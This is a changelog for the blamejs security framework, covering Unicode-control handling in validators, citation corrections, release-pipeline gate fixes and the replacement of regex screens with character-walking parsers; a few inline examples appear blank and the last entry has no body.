Detection and transformation read the same table, and a test refuses any `lib/` enforcement path that goes back to the narrower C0 block — reporting a character and then handing it back in the output is the failure that made this worth chasing. A guard whose policy resolves to `audit` is unchanged in disposition but now reports the finding, which is what lets a gate that validates before sanitizing reach its strip.

Under a `strip` policy — which is what the balanced profiles use — `validate()` now returns `ok: false` where it returned `ok: true`, carrying a `zero-width` issue. Through `gate()` nothing changes: the action is still `sanitize` and the character is still removed, because the disposition comes from the policy rather than the severity, and this is the same shape the Unicode Tags class has had since 0.18.28. If you call `validate()` directly and branch on `ok`, that branch now sees a document which is not clean as-is rather than one that is; `sanitize()` returns it repaired.

Control-character severity follows the resolved policy for the same reason, so `controlPolicy: "audit"` now reports rather than refuses. No shipped profile selects it, so this changes nothing you get by default — it makes the setting mean what it says if you select it yourself. Bidi overrides and null bytes still carry a fixed severity and still refuse under `audit`; ten shipped permissive profiles select `audit` for bidi, so honouring it there would change what `permissive` does with a Trojan-source payload. That is a decision about the profile rather than a detail of this fix, and it is tracked separately.

If you validate operator-supplied YAML, XML, Markdown, JSON, shell, regex, JSONPath or template text and have been relying on the old behavior, check that before upgrading. `b.guardDomain` is affected at every profile, including `permissive` — the identifier guards declare all four character policies as `reject` at every profile by design, the same universal refusal the bidi override already had.

items.title: b.session.useStore closes the store it replaces
items.body:
`b.session.useStore(store)`, `b.session.useStore(null)` and the test-reset helper all dropped the previous store by reassigning the reference. `b.session.stores.localDbThin` holds an open SQLite file, so the handle stayed open for the life of the process (#596).

On Windows an open handle blocks removal of the file AND of the directory holding it, so anything pointing sessions at a scratch directory could not clean up after itself; on Linux the unlink succeeds and the descriptor leaks until exit. Reported against a scratch-directory teardown, and the same reassignment was in all three paths — replacing one store with another leaked as well, which the report did not mention.

The outgoing store is now closed when it exposes a `close()`. The required store surface is unchanged — `execute` and `executeOne` — so a store you supplied without a `close()` is left alone. A rejected argument leaves the installed store open and serving, and re-installing the store already in use does not close it. When the outgoing `close()` throws, `useStore` raises `SessionError` (`session/store-close-failed`) AFTER the new store is installed: the swap has taken effect, so it reports a handle that may have leaked rather than a call to retry.

For that report to be reachable at all, `b.session.stores.localDbThin` had to stop discarding its own close failure — it swallowed the error at two layers, marked the handle closed and emitted a `localdb.thin.closed` audit while the file was still open. `close()` now propagates, and records the close only once it has happened. A `close()` that returns a promise is started rather than awaited, since the swap is synchronous; its rejection is absorbed so it cannot take the process down, which also means an asynchronous close failure is not reported.

`b.audit.useStore` is deliberately unchanged. Its store is operator-supplied with a `record(row)` contract that has no `close()`, and the framework ships no audit store factory — closing an object it never opened is not its business. `localDbThin` is the only store the framework hands out with a handle to release.

items.title: Vendored dependencies are current
items.body:
`@blamejs/pki` moves to 0.5.9. It reports sender-authentication verdicts that previously answered a question nobody asked — `cms.decrypt` now says whether the origin was authenticated and what the integrity rests on, and `smime.verify` takes an `expectedSender` and reports what the certificate actually asserts — and it fixes an rfc822Name comparison that folded the host-part with a Unicode-aware lowercase, so `U+212A KELVIN SIGN` made two separately registrable domains compare equal. The framework calls `crl.sign`, `key.export` and `webcrypto.subtle`, none of which changed shape.

The Public Suffix List is refreshed to the 2026-08-17 snapshot. Among the changes: `*.aivencloud.com`, `*.cursorusercontent.com`, `codepen.app`, `codepen.dev`, `here.now`, `online-server.cloud` and the Scaleway regional entries are now public suffixes, and `adaptable.app` no longer is.

items.title: HTTP citations name RFC 9110, 9111 and 9112
items.body:
RFC 7230 through 7235 were obsoleted in June 2022. Around eighty citations across twenty-five files still named them, in comments, in operator-facing error messages, and in the module blocks that generate the reference documentation.

The mapping is not arithmetic — the six documents were reorganized into three along different lines — so each section was confirmed against the successor's table of contents. A few that a reader might expect to have stayed put did not: 206 Partial Content is RFC 9110 §15.3.7 rather than anything under range requests, the authentication challenge grammar is §11.3, and establishing a protection space is §11.5. Cache-Control genuinely does keep §5.2, in RFC 9111.

No obsoleted HTTP-core citation remains in the framework's own source. Seven remain inside the vendored `@blamejs/pki` bundle, which ships in the package but is not edited here — those move when the bundle is next refreshed from upstream.

items.title: DMARC citations name RFC 9989, and the reporting ones name RFC 9990 or 9991
items.body:
RFC 7489 was replaced by three documents: the mechanism (RFC 9989), aggregate reporting (RFC 9990) and failure reporting (RFC 9991). Seventy-two citations moved, including the rule that decides what to do with a message carrying more than one `From` header — the header-duplication spoofing shape — which moved from §6.6.1 to §5.3.1.

The aggregate report XML schema is now RFC 9990 Appendix A and the email transport for those reports is §3.5.2, so `b.mail` cites those rather than RFC 7489's Appendix C.

One set of citations deliberately stays on RFC 7489. The `pct=` tag, which lets a domain apply its policy to a sample of failing mail, was removed in RFC 9989. `b.mailAuth` still honours it, because domains published `pct=` for a decade and those records are still in DNS: ignoring the tag would silently promote `p=reject; pct=10` from rejecting a tenth of failing mail to rejecting all of it. Dropping support is a deliverability decision to schedule, not a side effect of updating a reference, and the comments now say so.

One thing the new citations must not be read as claiming: policy DISCOVERY is not RFC 9989 §4.10's DNS tree walk. Three names are queried, in order — the exact domain, the organizational domain (RFC 7489 §6.6.3's two-step lookup), and, only when neither published a policy, the public suffix itself, honored when that record carries `psd=y` for TLD-operator policy (RFC 9989 §4.7). The tree walk queries each ancestor in turn, so it finds a policy published at an INTERMEDIATE label that none of those three reach: for `a.b.example.com` it would consider `_dmarc.b.example.com`, and a `p=reject` there evaluates as `none` here. If your senders publish policy at intermediate labels, that is mail delivered against an intended reject. The module documentation now says so where a reader will meet it, rather than only in a comment beside the code. Tracked as #31.

The same paragraph had been claiming the framework does not ship the Public Suffix List. It does — `b.publicSuffix` vendors it, and `b.mailAuth` has been using it for the organizational domain.

items.title: UUID citations name RFC 9562
items.body:
RFC 4122 was obsoleted in May 2024. `b.uuid`, `b.guardUuid`, `b.safeSchema` and the request-identifier paths cite RFC 9562 now — §4 for the field layout, §4.1 for the variant field, §5.4 for version 4.

Worth noting for anyone who has written the same comment: RFC 9562 does not describe the `10xx` variant as "the RFC 4122 variant". It calls it the variant specified in that document, so the older phrasing was a stale reference rather than a name.

items.title: Three references named an unrelated document
items.body:
Reported from a downstream tree that vendors this package and swept it for the same class (#593). Each of these named a real RFC that is about something else entirely, so a reader who followed the number landed somewhere with no connection to the code beside it.

**Clear-Site-Data is not RFC 9527.** RFC 9527 specifies DHCPv6 options for the Homenet Naming Authority. Clear-Site-Data has no RFC at all — it is a W3C Working Draft, and the header field it defines is §3.1 there. The wrong number appeared eleven times including in the `@card` annotation that generates the reference page for `b.middleware.clearSiteData`, and in `b.session.logout`, which composes it.

**ML-DSA is RFC 9881, not RFC 9909.** RFC 9909 carries the SLH-DSA algorithm identifiers. The two were transposed in `b.cms`, in both directions, so ML-DSA cited the SLH-DSA document and SLH-DSA cited the ML-DSA one. The parameter-set subsections cited alongside them do not exist either: RFC 9881 defines all three ML-DSA OIDs in §2 and has no per-parameter-set section.

**BIMI is not RFC 9091.** RFC 9091 is the experimental DMARC extension for public suffix domains, which is itself now obsoleted. BIMI has never been published as an RFC — it is `draft-blank-ietf-bimi` — so `b.mail.bimi` cites the draft, including in its own module documentation and in the header of the vendored trust-anchor bundle, which is the first thing an operator reads before populating that file with their own VMC and CMC roots.

Also corrected: `b.jsonapi` described its `sort` direction as following the JSON specification, which says nothing about sort order.

items.title: Smaller corrections, and the citations left deliberately alone
items.body:
XMLDSig algorithm URIs are registered in RFC 6931; `PKIFailureInfo` bit names come from RFC 4210; the `filename*` encoding `b.static` emits is RFC 8187 §3.2.1.

Several references that a currency check flags are correct as they stand, and were kept: `b.safeVcard` cites RFC 2425 and 2426 for the vCard 3.0 shape it still accepts while naming RFC 6350 as its primary specification; `b.middleware.bodyParser` cites RFC 5987 for `iso-8859-1` because RFC 8187 removed that character set; and the S/MIME, 8BITMIME and PKCS #1 references already named both the current document and its predecessor.

items.title: The regex-literal scanner decides operand position by the closed rule
items.body:
The gate that keeps `b.guard*` and `b.safe*` free of regular expressions decided whether a `/` opened a literal by listing what may precede one. That list is open-ended, so every missing entry was a silent hole — and `return /unsafe/.test(value)`, the most natural way to write a guard predicate, sat in one (#589).

It now asks the closed question instead: does the previous token END an expression? An identifier, a literal, a closing bracket, or one of `this` / `super` / `true` / `false` / `null` does; every other reserved word leaves operand position, so a `/` after it opens a literal. That covers every keyword without naming one, which is the property the previous formulation lacked.

Re-scanning all seventy-eight files found nothing had slipped through the old rule, so the family really was clean; the gate simply could not have held it. The scanner now also runs a fixture table against itself on every execution — keyword positions, division and in-string controls, member names, and the contextual cases — because the original controls passed throughout the period the hole existed, which is why review did not catch it. That table now stands at 367 rows, each of them distinct in both its source and its name, most of them generated by crossing the token kinds against the positions rather than written out one at a time, so a case nobody thought to list is still covered. The last of them came from walking the grammar — every compound assignment, every operator that leaves operand position, ternaries, spreads, computed keys, class static blocks, getters, generators and labels, each against both a literal and a division — rather than from waiting to be told about the next one. Every group in it is checked against a scanner with the corresponding fix removed, so a row that cannot fail does not stay in the table.

Eleven more places where the scanner read source as something other than what JavaScript says it is are closed as well. A template literal is only part text, and consuming through to the closing backtick swallowed its `${...}` expressions, so a literal inside one was invisible; substitutions are now scanned as code, with nesting and with the brace that closes one distinguished from a brace inside an object or a string. Whitespace other than a space or a tab was treated as a token, which made `count<NBSP>++ / 2 / 3` read as a regular expression and refused code that is entirely regex-free — the whole whitespace production is now separators. A lone carriage return ended a line comment nowhere, so everything after it on a CR-terminated file was skipped. A number was read a character at a time, so the trailing dot in `1.` became the previous token and turned the division after it into a literal. `of` was read as an identifier for a whole file, which is right for `var of = 12` and wrong for a for-head: `for (const m of /unsafe/g[Symbol.matchAll](v))` is valid JavaScript whose literal went unreported. It is now decided per occurrence: the separator sits at the head's own paren depth, occurs once, and follows the binding, so `for (const x of (of / 2 / 3))` and `for (of / 2 / 3; i < n; i++)` still divide. Both readings hold, including through `for await`. A private field name is a member name for the same reason a dotted one is, so `this.#delete / 2 / 3` divides rather than reading `delete` back as the keyword. The `)` that closes a control head leaves STATEMENT position, so an unbraced body like `if (v) /unsafe/.test(v)` opens a literal where `f(a) / 2` still divides. A line terminator cannot sit between a `break` or `continue` and its label, which settles the reading on both sides of one: a terminator after the label ends the jump, so a `/` on the next line opens a literal, and a terminator before the name means there is no label at all and the `/` after that name divides. A comment that carries the terminator separates the two exactly as a bare one does, and the keyword has to be the token immediately before the name, so a `break` that is a property's key leaves the name beside it an ordinary one. A declaration keyword before `of` marks a binding name rather than the separator, so `for (const of of xs)` — a loop binding a variable called `of` — reports the literal after the real separator. The two HTML-like comment forms JavaScript still carries for the web are comments here as well, because a CommonJS file is parsed as a script and both are part of that grammar: `<!--` runs to the end of its line wherever a comment may appear, and `-->` does the same when nothing but whitespace and comments precedes it on that line. Reading their contents as code reported a literal inside a comment. The shapes they are NOT are held apart — `a-->b` is a decrement and a comparison, and both sequences inside a string are text. And a shebang is skipped rather than scanned as code, where its `!` would have made `#!/usr/bin/env node` report `/usr/` as a literal — no file in the family carries one today, and now the first one that does will not be refused for it.

A violation now also names the line it is on. Any terminator the scanner passed over without counting — a lone carriage return, either Unicode separator, or one hidden behind a line-continuation backslash in a string or a template — put every later report an early line, pointing the reader at code that is fine. Four separate readers walk a line here, and each had spelled the terminator test out for itself; they now share one definition, which is what the last of the miscounts came down to.

One bias remains deliberate. `await` and `yield` are read as keywords even where they could be identifiers, because telling the two apart needs scope analysis this walker does not do, so a file that names a variable `await` and divides by it needs an allow-marker. For a gate whose purpose is finding literals, over-detection costs a one-line marker and under-detection costs silence.

items.title: Three detector classes registered in the allow-marker table
items.body: `regex-in-guard-or-safe-primitive`, `release-script-capture-status-unchecked` and `sfv-citation-must-match-referencing-protocol` all offer the `// allow:<class>` escape hatch but were absent from the table that validates those markers, so a marker naming one of them would have been rejected as naming no detector (#594). Latent rather than breaking, because the marker scan and those detectors do not currently cover the same files — but it bites the moment either widens.

releases.headline: Every standard the documentation cites now resolves to the document it names, and no shipped file carries an invisible character
releases.summary:
A documentation-accuracy release. Nothing in the framework's behavior changes; what changes is whether the references beside that behavior can be looked up and whether the text describing them survives being rendered.

Four citations pointed somewhere other than where they claimed. An ISO 27001 control number that exists in no edition of the standard. The CADF audit envelope attributed to an ISO standard about data-centre power monitoring. A GitHub security advisory identifier with no advisory behind it. And the structured-fields specification cited inconsistently across eighteen files, with no distinction drawn between the codec that implements the current revision and the field parsers whose own protocols are defined against the previous one.

Separately, six files carried Unicode characters that are invisible when rendered. One was a right-to-left override inside the checklist item that explains right-to-left override attacks — unterminated, so it reordered the rest of the line in any conforming reader. Another was a pair of zero-width joiners inside a media-type wildcard, which meant the value shown in the documentation would not match anything if an operator pasted it into an allowlist.

If you cite blamejs documentation in your own compliance evidence, the ISO control mapping for per-tenant quotas and the CADF standard reference both changed.

items.title: An ISO 27001 control number that exists in no edition
items.body:
Per-tenant quota enforcement was mapped to `ISO 27001 A.8.1.5`. The 2022 Annex A numbers its technological controls A.8.1 through A.8.34 with no third level, and the 2013 edition's A.8.1 stopped at A.8.1.4 — the control was never real in either.

It now cites A.8.3 (information access restriction) for the isolation the primitive enforces and A.8.6 (capacity management) for the caps, with the edition year attached, because the numbering is what changed between editions. The mapping appeared in `b.tenantQuota`'s own documentation and therefore in the generated reference, in SECURITY.md, and in both CIS crosswalks.

If you carried this mapping into a control matrix, it needs the same correction.

items.title: CADF attributed to the wrong standard
items.body: `b.audit.export({ format: "cadf" })` produces a Cloud Auditing Data Federation envelope, which is DMTF DSP0262. The documentation cited it as ISO/IEC 19395, which is a standard about smart data-centre resource monitoring and has nothing to do with audit federation — and gave it an edition year that does not match that standard either. Corrected in seven places, including the two comment blocks that generate the reference page.

items.title: A security advisory identifier with no advisory behind it
items.body: The markdown guard's threat catalog listed `GHSA-gwjh-c548-f787`, attributed to NuGetGallery. It returns 404 from GitHub's advisory API and is absent from OSV. It has been removed rather than replaced with a guess: a reader who looks up one citation and finds nothing has been given a reason to distrust the rest of the list. The neighbouring Joplin advisory was verified and remains.

items.title: Structured-fields citations now name the specification each field is defined against
items.body:
RFC 8941 was obsoleted by RFC 9651, but which number belongs in a comment depends on what that comment describes, and the documentation was not making the distinction.

`b.structuredFields` implements the current specification, including the Display String type RFC 9651 adds, and now says so throughout. Every other structured-fields citation in the framework describes a *field defined by some other protocol* — Cache-Status, Targeted Cache-Control, Client Hints, Digest Fields, Message Signatures, the HTTP core — and all of those specifications were published before RFC 9651 and reference RFC 8941. RFC 9651 §2.4 is explicit that it does not update them: a field whose definition references RFC 8941 cannot carry the new types, because a recipient may still be parsing it with an RFC 8941 parser. Those citations therefore stay on RFC 8941, and now do so consistently.

If you are reading the framework's field parsers against a specification, the number beside each one is the number that specification actually normatively references.

Also corrected: the outbound SMTP wire is produced per RFC 5322, not RFC 822; DMARC's multiple-`From` rule is RFC 9989 §5.3.1, not RFC 7489 §6.6.1; XMLDSig algorithm URIs are registered in RFC 6931; and `PKIFailureInfo` bit names come from RFC 4210.

items.title: Invisible characters in shipped text
items.body:
Six files carried Unicode characters that render as nothing.

The costly one was in the file-upload checklist in SECURITY.md and in `b.guardFilename`'s own documentation: a live right-to-left override, used to demonstrate the filename-spoofing attack the guard defends against. It had no terminating pop-directional-formatting character, so its effect ran past the example and reordered the remainder of the line. Both now write the codepoint as `<U+202E>`, which also makes it greppable and safe to copy.

The subtle one was in `b.guardMime`: two zero-width joiners inside a media-type wildcard, inserted so the sequence would not close the surrounding comment block. The rendered documentation showed a wildcard that looked ordinary and would have matched nothing if pasted into an allowlist. The sentence has been rewritten to avoid needing them.

The remaining three were a byte-order mark in the CSV export and the bidirectional-control set in the log redactor, both functional and now written as escapes, and one more override in an upload comment. The redactor was checked to match the same twelve codepoints as before, and the export to emit the same bytes.

items.title: Documentation corrections across the repository
items.body: The README claimed a published LTS calendar without linking to it; it now links, and states the 24-month security-patch window and the deprecation-warning commitment inline. A link to a maintainer file that has never existed has been replaced with what actually answers the question. Product names, regional spelling and code-fence language tags were made consistent across the repository documentation, and the CLI usage block is now tagged so it highlights correctly.

releases.headline: The publish pipeline refuses to substitute the working directory for a tarball it cannot find, and no release gate can be skipped by a failed lookup
releases.summary:
Nothing in the framework's own surface changes here. What changes is how a blamejs release is produced — two ways a release could previously be built on an answer nobody actually got.

The publish step resolved the packed tarball by searching for it and used the result without checking there was one. An empty result meant the command became `npm publish "./"`, which publishes the working directory as the package, with the run's provenance attached to it. That path now stops and says why, as do the four other steps that resolve the same file to hash, sign and attach it.

The release orchestrator asks `git` and `gh` questions and gates on the answers, and it read their output without checking whether the command had run. A failed lookup is indistinguishable from one that printed nothing, so a dropped connection or an expired token read as a settled fact: no backend touched, no wiki change, a clean tree, no open pull request. Each of those defaults let a gate be skipped rather than fail. Every gate now refuses an answer it could not get, and the read-only queries retry the connection-level failures first, so the change costs the flow nothing on a healthy network.

The tarball, the SBOMs and the provenance attestation this release publishes are verifiable exactly as before; the recipes in SECURITY.md are unchanged.

items.title: A publish that cannot resolve its tarball stops instead of publishing the working directory
items.body:
Five steps in the publish workflow locate the packed tarball by search — to hash it into the SLSA subject list, to take its SHA3-512, to sign it with the release ML-DSA key, to attach it to the release, and to publish it. None of them checked that the search returned anything.

An empty result is not a hypothetical: it is what an artifact that failed to download looks like. At the publish step it made the command `npm publish "./"`, and npm reads that as "publish this directory" — so a run that had lost its tarball would have published the checked-out tree in its place, and attached that run's provenance to it. Every one of the five now asserts a tarball exists before using the path, and fails the workflow with the reason if it does not.

items.title: A release gate refuses an answer it could not get
items.body:
The orchestrator decides which live backend tests are required by diffing the changed files, and whether the wiki end-to-end suite must run the same way. Both read the diff without checking the command succeeded, and an empty change set means "nothing to prove" — so a `git` failure silently downgraded a required gate to a skipped one.

The same shape ran through the pull-request lookups: an unreadable `gh pr list` reported "no open PR", and an unreadable review-state read reported that the reviewer had not reviewed, which is the one answer that is certainly wrong. All of these now distinguish an empty answer from no answer — a branch with genuinely no pull request, or a release that genuinely touches no backend, still reports exactly as before.

items.title: Transient network failures no longer surface as release-flow errors
items.body:
The orchestrator's read-only queries — pull-request state, review threads, workflow runs, the published version — now retry the connection-level failures before giving up: a reset connection, a TLS handshake that times out, a 5xx, a rate limit. A rejected token or a missing resource is not retried, because asking again cannot change that answer.

This matters because of how the flow queries: waiting for a review polls every twenty seconds for up to ten minutes, and each poll is a fresh process making a fresh connection. Retries are confined to queries that only read; anything that changes state is never retried.

items.title: Waiting for a review reports an unreadable state as unknown, not as "not reviewed"
items.body: The wait now distinguishes three outcomes. A connection blip is absorbed and re-asked on the next poll, since the poll is itself a much longer retry. A stable rejection stops immediately. And a wait whose lookups never succeeded reports the review state as unknown rather than as a review that did not happen. Its budget is also measured against the clock rather than by summing its own sleeps, so it bounds the ten minutes it advertises.

items.title: release-script-capture-status-unchecked
items.body: Refuses release tooling that reads a command's output without consulting its exit status. Consuming the output inline is refused outright — there is nowhere in that expression for a check to have happened — and a stored result must have its status read within the same function. The two places where a non-zero exit is itself the answer, testing whether a git ref exists and verifying a tag signature, read the status explicitly and are allowed.

releases.headline: No content-safety primitive screens input with a regular expression any more, and a gate keeps it that way
releases.summary: The change of technique that started in 0.18.29 is finished. Every `b.guard*` and `b.safe*` primitive now reads its input by walking the characters — 122 patterns across 33 files are gone, and a gate refuses a new one. Three things a pattern could not do, each of which had cost something real. It could not state its own cost: a value inside its byte cap could still take a screen 85 seconds, because the cap bounds the input and the pattern bounds nothing. It could not mean what it appeared to say: `\s` is twenty-five codepoints and not five, `\b` treats a hyphen as ending a word, and `.` never matches a line separator — so an address padded with U+00A0, a tag named ``, and a link definition split across two lines each passed a screen that looked like it covered them. And it could not read markup: a tag screen that ends at the first `>` reports `` as an image with no text alternative. The walks that replace them are shared rather than per-guard. `b.codepointClass` gained the folded search and range-run primitives, `b.safeBuffer` the byte-shape predicates, `b.markupTokenizer` now backs the accessibility scanners as well as the HTML and SVG guards, and the ISO 8601 grammar — which had been spelled five separate ways that disagreed at the edges — is one reader on `b.time`. The pattern exports those primitives replace are removed rather than aliased. Reading one throws and names what to call instead; an alias would hand back the runnable pattern the removal exists to eliminate.

items.title: One ISO 8601 reader on `b.time`
items.body:
- `readDate(text, at?)` — `YYYY-MM-DD`, returning each field as text plus where it stopped, or `null`.
- `readTime(text, at?, opts?)` — `HH:MM:SS` with optional fraction and offset. `offsetColon: "optional"` accepts `+0100` alongside `+01:00`.
- `readDateTime(text, opts?)` — the whole string, so trailing text is a refusal rather than an ignored tail. `separators` / `requireTime` / `requireOffset` / `offsetColon` carry the policy.
- `stripIsoMilliseconds(text)` — drop a trailing `.sssZ` to `Z`, for comparing two timestamps at one-second resolution without going through a `Date`.

The fields come back as TEXT rather than numbers, so a caller reporting on its input has the characters it was given.

Every date-time screen in the framework now reads this grammar and supplies its own policy, which is why `b.guardTime` can say which HALF of a timestamp is missing instead of that the shape is wrong.

items.title: Byte-shape predicates on `b.safeBuffer`
items.body:
`isBase64(v)`, `isBase64Url(v)`, `isLowerHex(v, length?)`, `isIpv6Hextet(v)`, `isTraceIdHex(v)`, `isSpanIdHex(v)`, `isHttpToken(v)`, and `stripLeadingHspace(s)` — the lstrip half of the pair `stripTrailingHspace` already covered.

These are functions rather than patterns on purpose: a caller holding a pattern runs it themselves, against a value this module has length-capped and they have not.

items.title: Shape checks on `b.safeSchema`
items.body: `isEmail`, `isUrl`, `isUuid`, `isDate`, `isDatetime`, `isIpv4`, `isIpv6`, `isCuid`, `isUlid`, `isBase64` — each the check the matching `.email()` / `.uuid()` / `.datetime()` schema method applies, callable directly. `DEFAULT_IDENTIFIER_SHAPE` on `b.safeSql` states the identifier rule in words, so every primitive that enforces it reports it the same way.

items.title: Walk primitives on `b.codepointClass`
items.body:
- `matchesAtFolded(text, at, needle)` / `indexOfFolded(haystack, needle, from?)` — ASCII-case-insensitive comparison that reports WHERE, in the original string. Lower-casing the subject first moves the answer: several codepoints case-map to more than one character, so an index into the folded string no longer refers to the same place.
- `isRunOfRanges(text, ranges, min?, max?)` — `isRunOf` against a range table, for the grammars whose alphabet is a span rather than a list.
- `isAsciiHexDigit(cc)`.
- `splitLinesAny(text)` — a lone CR ends a line too, which is the rule a vCard, an iCalendar object and a delivery status notification are written to.

items.title: `b.deprecate.removed(target, key, opts)`
items.body:
Define a property that throws on access, naming what to use instead. For surface that is gone rather than renamed — where reading the old name has to stop working, not keep working quietly. `alias` remains the tool for a rename.

The point is the failure message: a removed export is `undefined`, so the first thing an upgrading operator sees is `Cannot read properties of undefined` at whatever line happened to touch it. This throws at the access, and says what was removed, in which version, and what to call now. It refuses writes too, so the old name cannot be restored.

items.title: Every `b.guard*` and `b.safe*` primitive screens by walking characters
items.body:
`b.guardXml`, `b.guardMime`, `b.guardOauth`, `b.guardJsonpath`, `b.guardJwt`, `b.guardListId`, `b.guardListUnsubscribe`, `b.guardCidr`, `b.guardDsn`, `b.guardTime`, `b.guardGraphql`, `b.guardArchive`, `b.guardText`, `b.guardTraceContext`, `b.guardAgentRegistry`, `b.guardEventBusPayload`, `b.safeJson`, `b.safeSchema`, `b.safeSql`, `b.safeIcap`, `b.safeSieve`, `b.safeVcard`, `b.safeIcal`, `b.safeJsonpath`, and the accessibility scanners behind `b.guardHtml.wcag`.

Each conversion ships a test comparing the walk against the pattern it replaced across that primitive's corpus, so the equivalence is a checked claim rather than a reading of the diff.

The XML guard reads its whole threat catalog in one pass. It used to run ten patterns over the source, so a document that was one long run of a shared prefix cost a full scan per screen — and the cap that bounds that input is a byte cap, which means the multiplier was the sender's to choose.

items.title: The accessibility scanners read markup with the shared tokenizer
items.body: `b.guardHtml.wcag` and its ARIA, forms and tables passes now tokenize with the same reader as the HTML and SVG guards. That reader knows a `>` inside a quoted attribute value does not end the tag, which is what a browser does — so `` is one `img` element carrying a text alternative, where the previous screen read it as an `img` with none and reported a page that is accessible as one that is not. Its attribute reader also stops at the first thing that is not an attribute rather than scanning past it for the next name.

items.title: A schema `pattern` runs on the linear matcher
items.body:
An operator writes a JSON-schema `pattern`; the value it runs against arrives over the wire. That is the arrangement catastrophic backtracking needs — the attacker supplies the subject and the operator has, without meaning to, supplied the pattern. `b.safeJson.validate` now compiles it with `b.regexLinear`, which takes time proportional to the subject whatever the pattern says. A pattern using a construct the linear matcher does not implement — a backreference, a lookaround — still runs on the platform engine, but only after the ReDoS screen has passed it, and a pattern that fails the screen is reported as `json/bad-pattern` at validation time rather than as a request that stops returning.

`b.safeSql.validateIdentifier` screens an operator-supplied `pattern` the same way. The identifier is capped at 63 characters, but a nested quantifier over 63 characters does not finish.

items.title: Vendored `@blamejs/pki` moves to 0.5.7
items.body:
The toolkit behind `b.mtlsCa`, `b.auth.passkey` and the TLS certificate paths. 0.5.7 closes both directions of the CMS SignedData forgery in draft-vangeest-lamps-cms-euf-cma-signeddata: `pki.cms.verify` refuses a SignerInfo with no signed attributes whose content is itself an encoded SignedAttributes block, and `pki.cms.sign` refuses to mint the ambiguous signature that makes the other direction possible.

Two more that reach any caller passing bytes. A byte argument whose backing store has been transferred away — a `structuredClone` with transfer, a worker hand-off — used to read as empty rather than throw, so a signature could be produced over no content at all; it is now refused. And every producing verb copies its arguments at entry, closing the window where a caller still holding a spec could change a field after the checks had read it.

One timing change: the verbs documented as returning a Promise now run their body at the call rather than a turn later. The framework awaits every call it makes, so nothing here changes for an operator using `b.mtlsCa` or `b.auth.passkey`.

items.title: A signature with a malformed encoding is reported as malformed
items.body: `b.httpMessageSignature.verify` carried a base64 shape check on the signature that could never fail, so a corrupt signature was decoded to a shorter buffer — Node's decoder drops characters outside the alphabet rather than failing — and reported as a verification failure. It now returns `bad-signature-encoding`, which is what happened.

items.title: The exported patterns on `b.safeBuffer`, `b.safeSchema` and `b.safeSql`
items.body:
`HEX_RE`, `BASE64URL_RE`, `BASE64_RE`, `IPV6_HEXTET_RE`, `TRACE_ID_HEX_RE`, `SPAN_ID_HEX_RE`, `RFC7230_TCHAR_RE`, `CRLF_RE` and `TRAILING_HSPACE_RE` on `b.safeBuffer`; `EMAIL_RE`, `URL_RE`, `UUID_RE`, `DATE_RE`, `DATETIME_RE`, `IPV4_RE`, `IPV6_RE`, `CUID_RE` and `ULID_RE` on `b.safeSchema`; `DEFAULT_IDENTIFIER_RE` on `b.safeSql`; `ISO_MS_RE` on `b.time`.

Reading any of them throws, naming the predicate to call instead — `b.safeBuffer.HEX_RE` points at `isHex(value)`, `b.safeSchema.EMAIL_RE` at `isEmail(value)`, and so on. They are not aliased to the new predicates: an alias would hand back a runnable pattern against a value the framework has capped and the caller has not, which is the thing the change removes.

items.title: A regular expression in a content-safety primitive fails the build
items.body: `regex-in-guard-or-safe-primitive` finds a pattern literal in any `lib/guard-*.js` or `lib/safe-*.js` by tokenizing, so a division or a comment is not mistaken for one. The allowlist is empty and stays empty: a genuine need for a pattern in that family means a walk primitive is missing, not that the gate should grow an entry.

releases.headline: Nine more guards screen by walking characters instead of matching patterns, and the token shapes they share are one set of primitives
releases.summary:
The change of technique that started in 0.18.29 reaches `b.guardEmail`, `b.safeMime`, `b.guardShell`, `b.guardTemplate`, `b.guardYaml`, `b.guardUuid`, and the four line-protocol guards (`b.guardSmtpCommand`, `b.guardImapCommand`, `b.guardPop3Command`, `b.guardManageSieveCommand`). Every screen in them is now a single pass over the characters, and each one ships with a test comparing it against the pattern it replaced over a corpus of the inputs that guard exists to classify — the addresses, encoded words, metacharacters, anchors and literal openers, including the near misses.

Six primitives on `b.codepointClass` carry the shapes those guards had been spelling separately: an anchored bounded token run, the ASCII character-set constants it reads, the two ASCII predicates, the identifier-boundary predicate, and the line and whitespace splits.

Nothing an operator calls changes shape here. The screens answer the same questions; they no longer answer them through a second grammar.

items.title: Token and splitting primitives on `b.codepointClass`
items.body:
- `isRunOf(text, chars, min?, max?)` — is every character drawn from `chars`, within a length range? The anchored, length-bounded token a protocol grammar is written in: an IMAP tag, a POP3 message number, an ESMTP parameter name.
- `ASCII_DIGITS` / `ASCII_ALPHA` / `ASCII_ALNUM` / `ASCII_HEX` — the sets, so a call reads as `ASCII_ALNUM + "._-"` rather than as sixty-two typed characters.
- `isAsciiLetter(cc)` / `isAsciiDigit(cc)` — the two predicates every scanner needs.
- `isIdentifierChar(cc)` — a letter, a digit or an underscore: the boundary that keeps `DATABASE` from reading as `DATA` and `#ends` from reading as `#end`.
- `splitLines(text)` — split on LF, dropping a CR before it. A bare CR does not end a line, which is what makes one the signal a line-protocol guard screens for.
- `splitOnWhitespace(text)` — the tokens of a protocol line, over the full whitespace set rather than the ASCII five.

items.title: Vendored `@blamejs/pki` moves to 0.5.6
items.body:
The toolkit behind `b.mtlsCa`, `b.auth.passkey` and the TLS certificate paths. 0.5.6 closes a CMS SignedData forgery — a parsed structure presented its signed byte range, its signature and its certificates as separate properties, so a message a trusted signer really signed could be re-presented with the signature's own preimage as the content and verify as something they never signed. `pki.pkcs12.build` now refuses a store with no password instead of building one under the empty password, validates `integrity.mode` against the value it accepts, and `pkcs12.open` charges its key-derivation budget on the modern PBES2 path as well as the legacy one. `pki.tsp.verify` reports whether revocation was established rather than only whether the chain built.

One shape change: a verb documented `-> Promise` now rejects on a bad input instead of throwing before the promise exists. The framework awaits every call it makes, so nothing here changes. If you call the toolkit directly inside a synchronous `try`/`catch` without consuming the promise, that `catch` no longer fires — its `MIGRATING.md` has the detail.

items.title: The screens in nine guards are character walks
items.body:
